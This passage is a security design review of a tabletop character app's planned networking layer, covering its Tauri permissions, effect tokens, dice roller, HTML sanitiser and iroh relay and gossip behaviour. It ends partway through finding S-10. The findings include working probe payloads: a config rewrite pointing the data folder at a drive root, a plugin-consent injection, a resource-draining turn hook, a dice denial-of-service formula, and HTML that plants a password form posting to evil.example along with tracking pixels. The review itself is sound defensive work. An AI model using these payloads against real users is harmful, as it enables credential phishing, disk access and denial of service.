# Table link — design review

Companion to [the threat model and attack catalog](table-link-threats.md), written 2026-10-05
without reading it first and then compared against it. That document asks what the table-link layer
can do to a user; this one asks what the existing code does once a network input exists, and how
the module can be built wrong. It covers twelve security findings (S), eleven architectural ones
(F), what the earlier catalog misses, and the decisions a spec has to take first.

**Progress:** complete. Four findings carry a **Status** line: the defects that did not wait for
the module are fixed. The rest is planned as the 0.8.0 seams wave (`docs/plan.md`), which ships no
networking.

**Written:** Own findings, comparison with the prior review, published work, the
independent citation check and the open research list are all written.

**The five that matter most.**

1. **S-05** — an effect carried as tokens is a program; `on_event` runs executor verbs every turn
   with no click. A GM request must name catalog ids, never carry tokens.
2. **S-10** — iroh-gossip has no admission control and no authorship; GM approval cannot rest on it.
3. **S-01** — the data-folder pointer is writable from the webview on Windows and macOS, and is
   re-granted unchecked at next launch. A defect in today's app.
4. **F-03** — "the same actions as local UI" are view-model methods bound to form fields and to
   effects that run only on the combat route. Extracting them is the first milestone.
5. **S-09** — iroh dials whatever relay URL a remote's address names.

A finding is one of two kinds, and says which: **present** (already in the code, becomes a hole once
a network input exists — checkable today) or **spec** (an easy mistake while implementing — a
requirement on the specification).

## How I reviewed

**Pinned versions.**

| What | Version / commit |
| --- | --- |
| Charnik | local `main` at `9e327f7c` (0.7.0 in `tauri.conf.json`, 81 commits ahead of the published branch) |
| iroh | `n0-computer/iroh@b4c8fc68ef21b78781741fab8c6c86a1043d0f97` (1.3.0) |
| iroh-gossip | `n0-computer/iroh-gossip@2885dd9f1120e46aca5acbcd7f212e4c64e278b9` (0.101.0) |
| Rust crates as locked | tauri 2.11.5, tauri-plugin-fs 2.5.2, tauri-plugin-opener 2.5.5, tauri-plugin-log 2.9.1, dirs 6.0.0 |
| JS libraries as installed | dompurify 3.4.16, marked 18.0.12, zod 4.6.2 |

**Read.** `AGENTS.md`, `docs/README.md`, `docs/internals/{security,overview,characters,actions,plugins}.md`;
all of `src-tauri/` (`lib.rs`, `build.rs`, `Cargo.toml`, `capabilities/default.json`,
`tauri.conf.json`); `src/lib/storage/{tauri,path}.ts`; `src/lib/character/{schema,repository,store.svelte,assemble,derive-gather,derive-plugins}.ts`;
`src/lib/effects/{token-parser,apply,action-token,plugin-host}.ts`; `src/lib/rules/dice.ts` (the
parser and roller); `src/lib/content/{markdown,watcher}.ts`; `src/lib/actions/provenance.ts`;
`src/lib/util/links.ts`; `src/lib/diag/logger.ts`; `src/routes/+layout.svelte`,
`src/routes/combat/{+page.svelte,combat-view-model,hit-points,action-executor,effects-editor}`,
`src/routes/build/build-view-model.svelte.ts` (hydrate and save). In iroh: `endpoint/presets.rs`,
`endpoint/hooks.rs`, `defaults.rs`, `portmapper.rs`, `socket/transports/relay/actor.rs`,
`iroh-base/src/relay_url.rs`, `iroh-relay/src/{client.rs,client/tls.rs,protos/handshake.rs}`,
`Cargo.toml`, `CHANGELOG.md`. In iroh-gossip: `net.rs`, `api.rs`, `proto.rs`, `proto/plumtree.rs`.
In the cargo registry: the tauri path resolver and ACL check, `dirs`, the opener scope, the log
plugin.

**Not read.** `docs/plan.md`, `effects.md`, `packs.md`, `content.md` beyond greps; the L2 expression
evaluator; the plugin sandbox; the pack installer; iroh's QUIC, TLS and hole-punching code. Findings
make no claim about them.

**Ran.**

- `tsx` over the repo's own `rules/dice.ts` with oversized formulas (S-06) — timings quoted there.
- Headless Chromium (the repo's Playwright) loading the installed DOMPurify and marked, sanitising
  sixteen payloads in the app's own order (S-07) — survivors quoted there.
- Greps for every `{@html}`/`innerHTML`, every Tauri import, every caller of the save functions,
  every `MAX_`-style cap, and for any prior decision about networking in `docs/` (none outside the
  prior review).
- Lockfile inspection for the `tracing`/`log` bridge in both trees (S-04).

**Not run.** Nothing was driven on a real desktop install or a device, and no iroh code was
compiled. Findings that depend on that say so under *How to verify*.

**How claims are marked.** Each finding carries a kind (**present**: in today's code; **spec**: a
requirement on the specification), a severity and a confidence. Evidence is `file:line` read at the
versions above. Where this document borrows the prior review's tags they mean the same thing:
**[lit]** published work, **[inference]** reasoning not verified. Every external citation and every
statement about iroh, Tauri and plugin behaviour was re-checked by an independent agent that was
given only the claim and the source; its verdicts are in *Citation check* at the end.

## Findings

### S-01 — The data-folder pointer is writable from the webview on Windows and macOS

- **Status:** closed in the app, and driven on a Windows install. The capability denies `$APPCONFIG`, `$APPDATA` and `$APPLOCALDATA` and no longer uses `fs:default`, whose scope over the app directories is global and was enough on its own to keep the pointer writable — removing the `appdata` permissions alone changed nothing. `apply_saved_data_dir` refuses a root. A probe on the running app had write, rename and copy onto `config.json` all refused. macOS is unverified.

- **Kind:** present. **Severity:** high. **Confidence:** high (source-read; not yet driven on a real install).
- **Hypothesis.** Script running in the webview can rewrite `<appConfig>/config.json` and so choose
  the directory Rust grants recursively at the next launch — the whole disk. The design assumes the
  pointer is Rust-owned; that holds only on Linux.
- **Evidence.**
  - `src-tauri/capabilities/default.json:17` grants `fs:allow-appdata-write-recursive`, and
    `:40-41` puts `$APPDATA` and `$APPDATA/**` in the fs scope.
  - `src-tauri/src/lib.rs:33-39` puts the pointer at `app_config_dir()/config.json`;
    `lib.rs:106-115` (`apply_saved_data_dir`) grants whatever it holds "with no check"
    (`docs/internals/security.md:38-39` states the assumption: "sound only because the pointer file
    is Rust-owned").
  - Tauri 2.11.5 `src/path/desktop.rs:238-250`: `app_config_dir` is `dirs::config_dir()/<identifier>`,
    `app_data_dir` is `dirs::data_dir()/<identifier>`. `dirs` 6.0.0 `src/win.rs:8,10` returns
    `known_folder_roaming_app_data()` for both; `src/mac.rs:10,12` returns `app_support_dir()` for
    both. So `$APPDATA == $APPCONFIG` on Windows and macOS, and the write grant on one is a write
    grant on the pointer.
  - `lib.rs:30-32` and `src/lib/storage/tauri.ts:44-46` both say the renderer's appConfig write
    capability "is dropped"; the capability file dropped `appconfig-write`, not `appdata-write`.
  - Nothing in `src/` reads or writes `$APPDATA` (grep for `appDataDir|BaseDirectory` finds only a
    comment at `storage/tauri.ts:12`), so the grant is unused surplus.
- **Why table link raises it.** Today script-in-webview needs a DOMPurify or Svelte escape. Table
  link adds a remote party who delivers strings into that webview on a schedule of their choosing,
  and adds a secret (the endpoint key) worth reaching the disk for.
- **How to verify.** A `/dev/` probe on the desktop app: `writeTextFile(await join(await
  appConfigDir(), 'config.json'), '{"dataDir":"C:\\\\"}')` from the webview; expect it to succeed on
  Windows. Relaunch, then `readDir('C:\\Users')` from the webview.
- **Suggested guard.** Remove the three `fs:allow-appdata-*` permissions and the `$APPDATA` scope
  entries; or move the pointer to a directory no capability names (`app_local_data_dir` is outside
  every scope entry here). Independently, `apply_saved_data_dir` should not be unconditional: a
  pointer that names a filesystem root or a system directory is refused.

### S-02 — App commands are callable from every local webview; the capability's `windows` list does not gate them

- **Kind:** spec. **Severity:** medium (high once a second webview exists). **Confidence:** high.
- **Hypothesis.** Table link will add `#[tauri::command]`s on the Rust side (connect, approve a join,
  send a proposal, read the ticket). Written the way the four existing commands are, they are not
  subject to the ACL at all: any webview serving a local URL may invoke them, whatever
  `capabilities/default.json` says.
- **Evidence.** `src-tauri/build.rs:1-3` calls bare `tauri_build::build()` — no
  `AppManifest::commands`. Tauri 2.11.5 `src/webview/mod.rs:1823` runs the ACL check only when
  `plugin_command.is_some() || has_app_acl_manifest || !is_local`. The four commands at
  `src-tauri/src/lib.rs:155-160` are therefore ungated; `capabilities/default.json:5`
  (`"windows": ["main"]`) restricts plugin commands only.
- **How to verify.** Add a second `WebviewWindow` with a label not in any capability and call
  `invoke('saved_data_dir')` from it; it answers.
- **Suggested guard.** Declare the app manifest in `build.rs`
  (`tauri_build::Attributes::new().app_manifest(AppManifest::new().commands(&[...]))`) before the
  first table-link command exists, so each one needs an `allow-*` permission in a capability. Do it
  for the existing four in the same change.

### S-03 — Plugin consent and the kill switch live in `localStorage`, inside the trust boundary they guard

- **Kind:** present. **Severity:** medium. **Confidence:** high.
- **Hypothesis.** "Stored outside the data folder" protects against a restored backup arriving
  pre-authorised. It does not protect against script in the webview, which can write the consent
  record and the plugin folder in the same breath. If table-link permissions (which GM is trusted,
  auto-approve settings, the paired-peer list) are stored the same way, a single injection grants a
  peer standing authority.
- **Evidence.** `src/lib/effects/plugin-host.ts:18-19` ("localStorage, app-side"), `:234-248`
  (`PREFS_KEY = 'charnik:plugins'`, `readStored`/`writeStored`).
- **How to verify.** In devtools: `localStorage['charnik:plugins'] = JSON.stringify({consent:{x:'<hash>'},enabled:{x:true},killSwitch:false})`
  with a matching folder written through `Storage`; the plugin runs on next discovery with no dialog.
- **Suggested guard.** Pairing state and the endpoint secret key are Rust-owned and never readable
  from JS; approval of a join is a native dialog (the pattern `pick_data_dir` already uses,
  `lib.rs:53-61`), not a webview modal the page can click for the user.

### S-04 — iroh's `tracing` output will reach the app's log file if the `tracing/log` bridge is on, and nothing redacts it

- **Kind:** spec. **Severity:** medium. **Confidence:** medium (mechanism read in source; which
  crate turns the feature on is unverified).
- **Hypothesis.** `tauri-plugin-log` installs the process-global `log` logger. `tracing` emits `log`
  records when its `log` feature is enabled and no tracing subscriber is set. Cargo unifies features,
  so one dependency enabling it sends every iroh `info!/warn!/error!` — endpoint ids, relay URLs,
  socket addresses — into `%LOCALAPPDATA%\<id>\logs`, the file users are told to attach to bug
  reports. The app's own redaction (`redactPath`) lives in the JS facade and never sees these lines.
- **Evidence.**
  - `src-tauri/src/lib.rs:166-185`: Debug in dev, Info in release, to Stdout, Webview and `LogDir`;
    no `level_for`, no `filter`. `tauri-plugin-log` 2.9.1 `src/lib.rs:875-876` calls
    `log::set_boxed_logger` / `log::set_max_level`.
  - The **Webview** target matters separately: every Rust log line is also delivered to page JS.
  - App today: `src-tauri/Cargo.lock` `tracing 0.1.44` lists no `log` dependency — bridge off.
  - iroh at the pinned commit: `Cargo.lock` `tracing 0.1.44` lists `log` — bridge on inside iroh's
    own workspace. Whether a non-dev dependency does it is **unverified**.
  - `src/lib/diag/logger.ts:14-16` states the redaction rule and that the plugin has none built in.
- **How to verify.** In a scratch crate depending on `tauri-plugin-log` and `iroh`:
  `cargo tree -e features -i tracing` and look for `tracing feature "log"`. Then bind an endpoint
  and read the log file.
- **Suggested guard.** `.level_for("iroh", LevelFilter::Warn)` and the same for `iroh_relay`,
  `iroh_gossip`, `noq*` is the floor; better, a `.filter()` that drops every target outside the
  app's own. Remove the `Webview` target for non-app targets. Add a test that greps a session's log
  for the endpoint id.

### S-05 — An effect that arrives as tokens is a program: `on_event` runs executor verbs every turn with no click

- **Kind:** present (the path exists; table link supplies the remote author). **Severity:** critical
  for the "GM message is a proposal applied through the same actions as local UI" design.
  **Confidence:** high.
- **Hypothesis.** The local "add effect" action takes raw token strings. If a GM proposal
  ("apply Bless") is carried as `{label, tokens}` and applied through that action, the player
  approves a label and receives arbitrary tokens. One token of kind `on_event` installs a hook that
  survives in `character.json` and runs a `;`-separated list of executor verbs at every turn start,
  auto-applied, with no prompt: `rest:long`, `restore_resource`, `spend_resource:<id>:<n>`,
  `gain_slot`, `heal`, `roll`, `attack:<id>:12`, `apply_effect`. Other kinds are as strong in a
  quieter way: `set_override:hp_max:1`, `halve:speed`, `auto_fail:saves`, `grant_resource`,
  `plugin:<ns>:<handler>:<256 chars the attacker chose>`.
- **Evidence.**
  - `src/routes/combat/effects-editor.svelte.ts:230-260` — `addEffect({label, tokens, …})` writes the
    tokens verbatim into `play.effects`; the doc comment at `:237-238` already names "custom/GM
    effects (baked only)".
  - `src/lib/character/derive-gather.ts:183-206` — every `play.effects` entry without a live catalog
    row is folded from its own `effects` array, at the `condition` layer.
  - `src/lib/effects/token-parser.ts:517-525` — `on_event:<event>:<action>`; only the first `:` is
    structural, the action keeps everything after it including `;`.
  - `src/lib/effects/apply.ts:236-238, 284-291` — the hook lands in `facts.onEvent`.
  - `src/routes/combat/action-executor.svelte.ts:190-193, 207-211` — `nextTurn` and `toggleCombat`
    call `fireEventHooks`, which calls `runAction(hook.source, hook.action)` for every hook; the only
    gate is `play.autoCalc`. `:245-252` splits on `;`; `:261-318` is the verb table.
  - `src/lib/character/derive-plugins.ts:84` — `plugin:` tokens from the same list reach
    `expandPluginEffects` against whatever plugins this machine has consented to.
  - `src/lib/character/schema.ts:205-218` — `effectInstance.effects` is `z.array(z.string())`: no
    count cap, no length cap, no kind allowlist.
- **The same path in the other direction.** A player's shared character carries `play.effects`. If
  the GM's app derives that sheet with the ordinary pipeline, the player's tokens run through the
  GM's consented plugins, and pressing "next turn" on that sheet fires the player's hooks on the GM's
  machine.
- **How to verify.** Node test: a character whose `play.effects` holds
  `{effects: ['on_event:turn_start:spend_resource:rage:99;note:x']}`; derive; assert
  `sheet.facts.onEvent.length === 1`. Then drive `nextTurn` in Playwright and read the pool.
- **Suggested guard.** A network message never carries a token. It names a catalog row by
  `type:source:id` and the receiver resolves that id against its own content — or refuses when it
  has no such row. Where a free-form GM modifier is wanted, it is a closed struct
  (`{target, sign, amount ≤ N}`) that the receiver turns into one `flat_bonus` itself. A character
  received from a peer is derived in a mode where `on_event` and `plugin:` tokens are inert and the
  executor is not constructed.

### S-06 — The dice roller has per-term caps but no formula-length or total-dice cap

- **Status:** closed. `MAX_DICE_PER_FORMULA` caps a formula at 1000 dice across all terms. The executor still runs an action whose L2 formula failed to resolve; with the cap that is a wrong roll, not a freeze.

- **Kind:** present. **Severity:** high (remote freeze, and the result is persisted). **Confidence:**
  high — measured.
- **Hypothesis.** A GM roll request is a dice formula. `rollFormula` bounds each term (1000 dice,
  1000 sides) and each same-sided pool, but not the number of distinct sizes nor the number of
  subtracted terms, and not the string length. The L2 expression cap (512 chars) does not protect
  it, because an action whose formula fails L2 is passed on raw.
- **Evidence.**
  - `src/lib/rules/dice.ts:227-228` (caps), `:265-275` (`parseSignedDice`: negative terms are pushed
    one per match, uncapped; positive pools are capped per size only).
  - `src/lib/effects/action-token.ts:66-75` — on an L2 failure the raw token is returned ("executor
    no-ops" in the comment); `src/routes/combat/action-executor.svelte.ts:262-273` then calls
    `rollFormula(arg)` on it regardless.
  - Measured with the repo's own module (`tsx`, node 24): `'-1000d6'.repeat(2000)` (14 KB) →
    2,000,000 dice, 861 ms, an `expr` string of 18 MB. 1000 distinct sizes (8.9 KB) → 998,999 dice,
    an 11.5 MB `expr`. Growth is linear in input length.
  - The complete roll, dice array included, is appended to `log.jsonl`
    (`src/lib/character/repository.ts:475-484, 514-524`), which is read back on open.
- **How to verify.** `rollFormula('-1000d6'.repeat(20000))` in a node test with a timeout; then the
  same through `heal:` in an `on_event` token and watch `log.jsonl` grow.
- **Suggested guard.** Cap formula length (a few hundred characters) and total dice per roll (a few
  hundred) inside `parseSignedDice`, so every caller inherits it. Reject, not clamp, on the network
  path. Make the "executor no-ops" comment true: an action whose formula did not resolve does not
  run.

### S-07 — Sanitised prose can still carry a form, a full-window overlay, global CSS and remote images

- **Status:** closed for the form, the `<style>` element and the `style` attribute (`PROSE_POLICY` at the one sanitising seam); `form-action 'none'`, `base-uri` and `object-src` are in the desktop CSP and in a `<meta>` on the web build. Remote images still survive sanitising: blocked on desktop by `img-src`, and by the same directive on the web now. `class` and `data-*` attributes remain allowed.

- **Kind:** present. **Severity:** high (ticket and credential phishing inside the trusted window;
  UI redress of an approval dialog). **Confidence:** high — measured against the shipped versions.
- **Hypothesis.** DOMPurify's default profile stops script. It does not stop markup that deceives.
  A character shared by a player carries prose the GM's app renders through this pipeline
  (`ui.textOverrides`, `play.effects[].text`), so a peer can draw inside the GM's window.
- **Evidence.**
  - `src/lib/content/markdown.ts:34, 45, 57` — `DOMPurify.sanitize(html)` with no configuration.
  - Rendered through `{@html}` at `src/lib/components/ArticleProse.svelte:43,56,68` and through
    `innerHTML` at `src/lib/actions/provenance.ts:109`; reached from
    `src/routes/combat/effects-editor.svelte.ts:127-135` (`effectProse` falls back to `e.text`) and
    from `ui.textOverrides` (`src/lib/character/schema.ts:362`).
  - Measured (headless Chromium, DOMPurify 3.4.16 and marked from `node_modules`, the same
    `marked.parse` → `sanitize` order). These survive verbatim:
    `<form action="https://evil.example/x" method="post"><input type="password">…<button>`;
    `<div style="position:fixed;inset:0;z-index:99999;background:#fff">`;
    `<style>body{display:none}</style>`; `<img src="https://evil.example/pixel.png">`;
    `style="background:url(https://…)"`; `<svg><image href="https://…">`; `class="…"` and
    `data-sveltekit-*` attributes. Removed, as expected: `javascript:` hrefs, `on*`, `<meta>`,
    `<link>`, `<iframe>`, `formaction`, and `id`/`name` values that would clobber a DOM property.
  - Desktop CSP (`src-tauri/tauri.conf.json:24`) has no `form-action`, and `default-src` does not
    govern form submission; the root layout's click interceptor handles anchors
    (`src/lib/util/links.ts:25-37`), not submits. A submitted form navigates the main webview.
  - The web build ships **no CSP at all** (no `http-equiv` in `src/app.html`, no headers file), so
    there the remote image and `url()` requests also leave the machine: a read receipt with the
    viewer's IP address.
- **How to verify.** Put the form payload in a custom effect's text, open its ⓘ, submit; watch the
  desktop window navigate. Put the `<style>` payload in a text override and watch the sheet vanish.
- **Suggested guard.** One DOMPurify config at the single seam: `FORBID_TAGS: ['style','form',
  'input','button','textarea','select','img','svg','math']`, `FORBID_ATTR: ['style','class']`,
  `ALLOW_DATA_ATTR: false`. Add `form-action 'none'`, `img-src 'self' data: blob:`, `base-uri
  'none'`, `object-src 'none'` to the desktop CSP and ship the same policy as a `<meta>` in the web
  build. Peer-originated prose is rendered as plain text, never through this pipeline. Any pairing
  or approval prompt is a native dialog (S-03).

### S-08 — The character schema validates shape, not size, and its `id` is a local storage key

- **Kind:** present. **Severity:** high as a receive path, low today. **Confidence:** high.
- **Hypothesis.** `characterSchema` is the only gate a received character would pass, and it was
  written for a file the user owns. It bounds nothing a hostile sender would push on.
- **Evidence** (`src/lib/character/schema.ts`).
  - No length on any string: `ref = z.string().min(1)` (`:28`), `build.name` (`:124`), `notes`
    (`:198`), effect `label`/`text`/each token (`:205-213`), every record key.
  - No count on any array or record: `inventory`, `spells`, `play.effects`, `textOverrides`
    (`:362`), `usedRolls`, `currency`.
  - Unbounded numbers that drive work or display: `hp.current` and `hp.max` are bare
    `z.number().int()` (`:227-229`), `qty` has only a minimum (`:65`), `xp`, `currency`, `round`.
  - `id: slug` (`:31-33, 414`) has no length cap, and `con`, `nul`, `aux`, `prn`, `com1`, `lpt1` all
    match it — reserved device names on Windows. `src/lib/character/repository.ts:97-99` builds
    `characters/<id>/…` from it. More important than the device names: a sender who knows or guesses
    a local id makes `saveCharacter` overwrite that character (`repository.ts:262-281`), with only
    the throttled backup ring between the owner and the loss.
  - `build.photo` is an unconstrained string used as a file name
    (`repository.ts:304-310`); `sandboxRelative` (`src/lib/storage/path.ts:11-18`) stops `..` but
    not a nested path.
  - `z.object` strips unknown keys — good — but a forward-versioned peer's extra fields are
    therefore dropped silently on the first save (see F-03).
- **How to verify.** `characterSchema.safeParse` on a 50 MB `notes`, on 10^6 effects, on
  `id: 'con'`; then `saveCharacter` on Windows with `id: 'nul'`.
- **Suggested guard.** A separate, strict wire schema for the network path (`z.strictObject`,
  `.max()` on every string, array and record, numeric ranges) with a byte cap enforced in Rust
  before the bytes reach JS. The receiver assigns the storage key; the sender's `id` is data, never
  a path. Peer characters live under their own root (`table/<peer>/<guid>/`), never in
  `characters/`.

### F-01 — The builder saves the `play` it loaded when it opened; a network change made meanwhile is reverted

- **Status:** closed. The builder writes `build` over the file as it is at save time
  (`docs/internals/characters.md` ▸ One writer per character).

- **Kind:** present. **Severity:** high. **Confidence:** high.
- **Hypothesis.** A level-up in the middle of a session is the normal case. The builder holds its own
  copy of the character, loaded from disk when it opened, and writes that copy's `play` and `ui`
  back on save. Damage, a condition or a spent slot applied by the network in between is overwritten
  without a trace, and the GM's view and the player's file disagree from then on.
- **Evidence.** `src/routes/build/+page.svelte:63` loads through `loadCharacterBySlug` (a fresh
  object, not `characters.active`); `src/routes/build/build-view-model.svelte.ts:187` keeps
  `play: char.play`; `:464` passes `play: this.edit?.play`; `src/lib/character/assemble.ts:47`
  writes it into the assembled character; `build-view-model.svelte.ts:625` saves the whole object.
  `src/routes/combat/blocks/Hero.svelte:52` flushes the sheet before opening the builder — the
  one-directional handoff the design relies on today.
- **How to verify.** Node test over `MemoryStorage`: hydrate the builder VM from a character, write a
  changed `play.hp.current` to storage, call `save()`, read the file.
- **Suggested guard.** The builder writes `build` only: it re-reads the character at save time and
  merges, or the save API takes a part (`saveBuild`, `savePlay`) rather than a whole character. See
  F-02 for the general form.

### F-02 — `character.json` has no single writer, no revision and no merge; every save is a whole-object overwrite

- **Status:** closed. The single-instance guard is in (a second launch focuses the open window;
  confirmed on Windows), and the queue, the `rev`, the check before a write and the watcher on
  `characters/` are `docs/internals/characters.md` ▸ One writer per character.

- **Kind:** present. **Severity:** high. **Confidence:** high.
- **Hypothesis.** The file has at least seven writers and no ordering between them. Each takes a
  snapshot of an in-memory object and replaces the file. A network apply is an eighth writer that
  fires at times the user does not choose, which turns rare local races into routine ones.
- **Evidence.**
  - Writers: the combat autosave, 800 ms debounce (`src/routes/combat/+page.svelte:83-94`); the
    reload flusher (`:97-102`); immediate saves in `resource-tracker.svelte.ts:264,367`,
    `combat-view-model.svelte.ts:443`, `routes/spellbook/+page.svelte:67,120`; the text-override
    binding in `routes/+layout.svelte:136-139`; the builder (`build-view-model.svelte.ts:625`);
    snapshot restore (`src/lib/character/store.svelte.ts:152-158`); demo re-creation (`:92-101`).
  - `saveCharacter` (`src/lib/character/repository.ts:262-281`) validates, awaits a backup, then
    writes. Two overlapping calls can land out of order: the snapshot is taken at `safeParse`
    (`:263`), the write happens after the awaited backup (`:273`), so an older snapshot whose backup
    took longer is written last. The roll log has a per-slug promise chain for exactly this
    (`:495-512`); `character.json` has none.
  - No revision counter, no mtime check. `docs/internals/security.md:15-16` says writes are
    "mtime-guarded"; nothing in `repository.ts` or `storage/tauri.ts` reads an mtime before writing.
  - `restoreBackup` replaces `characters.active` with a new object (`store.svelte.ts:155`); anything
    still holding the old reference — a pending network apply, the combat VM — writes the
    pre-restore state back on its next save.
  - The file watcher covers `content` only (`src/lib/content/watcher.ts:63`), so a change to
    `characters/` made by a second instance or a folder-sync tool is never seen.
  - No single-instance guard: `src-tauri/Cargo.toml` has no `tauri-plugin-single-instance`. Two
    windows on one data folder already race; with table link they would also bind the same endpoint
    key twice.
- **How to verify.** Node test: two `saveCharacter` calls on a storage whose `read` of the first
  backup is delayed; assert which state is on disk. Desktop: launch the app twice.
- **Suggested guard.** One owner per open character: a queue that serialises every mutation and
  every write, with a monotonically increasing `rev` stored in the file and checked before a write.
  Network applies go through that queue as ordinary mutations. Add the single-instance plugin before
  the endpoint exists.

### F-03 — "The same actions as local UI" do not exist as callable functions; they are view-model methods that read form fields

- **Kind:** present. **Severity:** high (it decides the module's shape). **Confidence:** high.
- **Hypothesis.** The plan says a GM message is applied "through the same actions as local UI".
  Those actions are methods on the `combat` singleton in `src/routes/combat/`, they take no
  arguments, and the rules they enforce are split between the method and `$effect`s that run only
  while the combat route is mounted. A network apply therefore has three bad options: drive the
  player's input fields, duplicate the rules, or mutate `play` directly.
- **Evidence.**
  - `src/routes/combat/hit-points.svelte.ts:226-234` — `damage()` reads `this.hpAmount`,
    `this.damageType`, `this.moreParts`, `this.damageWasCrit`: the number the player is typing.
    Applying a GM's damage through it means overwriting that field.
  - Invariants that are `$effect`s in `src/routes/combat/+page.svelte:47-79`: clamp HP to max, reset
    death saves above 0 HP, drop an owed concentration save, leave a form, end concentration at
    0 HP. They do not run on Roster, Compendium, Settings, Spellbook or the builder.
  - The autosave is the same kind of `$effect` (`:83-94`). A network change applied while the player
    is on another route is not persisted until they return to the sheet.
  - `damage()` kills outright when the remainder reaches max HP (`hit-points.svelte.ts:254`) and
    adds death-save failures at 0 HP (`:259-264`): one accepted message with a large number is a
    dead character.
  - The view-model needs the content graph and the derived sheet (`combat-view-model.svelte.ts`
    host thunks); neither exists until the combat route has loaded.
- **How to verify.** Read-only: list every `$effect` in `routes/combat/+page.svelte` and every
  no-argument verb on `CombatVM`; each is a rule a headless apply would skip.
- **Suggested guard.** Before any network code: extract play-state mutation into pure functions
  `(character, sheet, intent) → character` in `src/lib` (the intent shape in
  `docs/internals/actions.md` §2 is already this), make the view-model call them, and move the
  `$effect` invariants into the same reducer so they hold wherever the mutation happens. That is a
  refactor with its own tests and no network in it.

### F-04 — Every save re-reads and re-validates the whole roster and rotates the global recompute key

- **Status:** the roster half is closed — a save puts its own line into the roster
  (`docs/internals/characters.md` ▸ One writer per character). Rate-limiting a peer is the spec's.

- **Kind:** present. **Severity:** medium. **Confidence:** high.
- **Hypothesis.** A save costs a full roster scan. That is fine at human speed and becomes a storm
  when a peer sets the rate.
- **Evidence.** `src/lib/character/store.svelte.ts:113-117` — `saveCharacterToStore` awaits
  `loadRoster()`; `:53-58` — `loadRoster` runs `listCharacters` and `bumpGuid()`;
  `src/lib/character/repository.ts:408-439` — `listCharacters` reads, parses, migrates and validates
  every `character.json`. The autosave effect serialises `play`, `ui` and `build` with
  `JSON.stringify` on every tracked change (`routes/combat/+page.svelte:89-91`).
- **How to verify.** Count `storage.read` calls for ten HP changes with twenty characters in
  `MemoryStorage`.
- **Suggested guard.** Update the one roster entry from the saved object. Rate-limit inbound
  messages per peer in Rust, before they reach the webview.

### F-05 — A character has no identity that survives leaving the machine

- **Status:** closed for the file — `uid`, and an id on every inventory and class row
  (`docs/internals/characters.md` ▸ Identities). Binding `(endpoint id, uid)` is the spec's.

- **Kind:** spec. **Severity:** high. **Confidence:** high.
- **Hypothesis.** "The same character" across GM and player has nothing to stand on. The only id is
  a local slug made from the name plus four hex digits, it doubles as the folder name, and the
  restore path already rewrites it.
- **Evidence.** `src/lib/character/repository.ts:333-341` (`uniqueCharacterId`: `hero-a3f9`, 16 bits
  of suffix); `:242-243` (restore re-anchors `id` to the folder); `schema.ts:414`. `AGENTS.md` ▸
  Taste asks for a GUID on anything shareable. Effect instances do carry one (`iid`,
  `effects-editor.svelte.ts:252`); inventory rows, class rows and spells do not, so "remove the
  second dagger" cannot be addressed either.
- **Suggested guard.** A random `uid` (128-bit) minted once and stored in the file, never derived
  from the name and never used as a path; the pairing binds `(endpoint id, uid)`. Decide before the
  first release that writes it, because adding it later is a migration on every save.

### F-06 — GM and player compute different numbers from the same character, and nothing says so

- **Kind:** spec. **Severity:** high. **Confidence:** high.
- **Hypothesis.** A save holds references, not values. Every derived number depends on the content
  graph, the enabled sources, collision choices, consented plugins, the auto-calc switch and the app
  version of whoever is looking. The GM's app will show an AC the player's app does not.
- **Evidence.** `docs/internals/characters.md:119-123` (id references only; missing content is
  flagged, not fatal); `src/lib/character/derive-gather.ts:194-204` (a runtime effect is read LIVE
  from the local catalog row when one exists, from the baked tokens otherwise — so the same effect
  resolves differently on two machines); `src/lib/effects/plugin-host.ts:252-260` (plugins run only
  where consented); `schema.ts:265` (`autoCalc` is per character, but `ui` and content toggles are
  per install).
- **Suggested guard.** The spec chooses one: the player's app is the only computer and sends derived
  values with their traces (the GM renders, never derives), or both derive and the handshake
  compares a content fingerprint (pack ids and hashes, plugin hashes, app and schema version) and
  shows the mismatch. The first also removes S-05's reverse direction.

### S-09 — iroh opens a relay connection to whatever URL a remote's address names

- **Kind:** spec. **Severity:** high. **Confidence:** high (source-read at the pinned commit).
- **Hypothesis.** A ticket is an `EndpointAddr`: an endpoint id plus addresses, one of which may be a
  relay URL. iroh treats that URL as a place to send datagrams, not as a name to look up in its own
  relay list. Whoever writes the ticket — or publishes an address record for their own endpoint id
  — makes the victim's app open an HTTP(S)/WebSocket connection to a host of their choosing and
  authenticate to it with the victim's endpoint key.
- **Evidence** (iroh @ `b4c8fc68`).
  - `iroh/src/socket/transports/relay/actor.rs:1206-1212` — a datagram for `(url, remote_endpoint)`
    asks `active_relay_handle_for_endpoint`; `:1279-1320` — if no open relay already knows that
    endpoint it falls through to `active_relay_handle(url)`; `:1322-1340` — which calls
    `start_active_relay(url)` for a URL it has never seen.
  - `:1345-1349` — the configured `relay_map` is consulted only to fetch an auth token. It is not an
    allowlist.
  - `iroh-base/src/relay_url.rs` — `RelayUrl` wraps any `url::Url`; `iroh-relay/src/client.rs:272-275`
    and `client/tls.rs:97-102` accept `http`/`ws` and then connect without TLS.
  - `iroh-relay/src/protos/handshake.rs:1-25, 52` — the client proves its key to the relay by
    signing a challenge under a fixed domain-separation string, so the signature is not reusable
    elsewhere; what the rogue relay gains is the victim's IP address, endpoint id and online times,
    and the ability to drop or delay the traffic it carries.
  - The same URL can arrive without a ticket: the `N0` preset resolves a remote's address from
    records the remote itself publishes (`iroh/src/endpoint/presets.rs:116-139`).
- **Consequences.** Deanonymisation of a player by a fake GM (or of the GM by anyone holding the
  ticket); a request from inside the victim's network to an attacker-named host and port;
  plaintext relay traffic metadata when the URL is `http`.
- **How to verify.** A two-endpoint test with a local relay not in either relay map: put its URL in
  the dialled `EndpointAddr`, assert the relay sees a connection.
- **Suggested guard.** Parse tickets in Rust and keep the endpoint id only, or keep a relay URL only
  when it is in the app's own relay map. Install an `EndpointHooks::before_connect`
  (`iroh/src/endpoint/hooks.rs:79-85`) that rejects any `EndpointAddr` naming a relay outside that
  map, so addresses learned from lookup are covered too.

### S-10 — iroh-gossip has no admission control and no message authorship; "the GM approves each join" cannot rest on it

- **Kind:** spec. **Severity:** critical if gossip carries table traffic. **Confidence:** high.
- **Hypothesis.** A gossip topic is joined by anyone who knows the topic id and one member. There is
  no hook where a GM says no, every member forwards for every other, and a delivered message does
  not say who wrote it. A leaked ticket is therefore a standing read-and-write pass to the table,
  and any player can speak as the GM.
- **Evidence** (iroh-gossip @ `2885dd9f`).
  - `src/net.rs:129-135` — `ProtocolHandler::accept` hands every incoming connection to
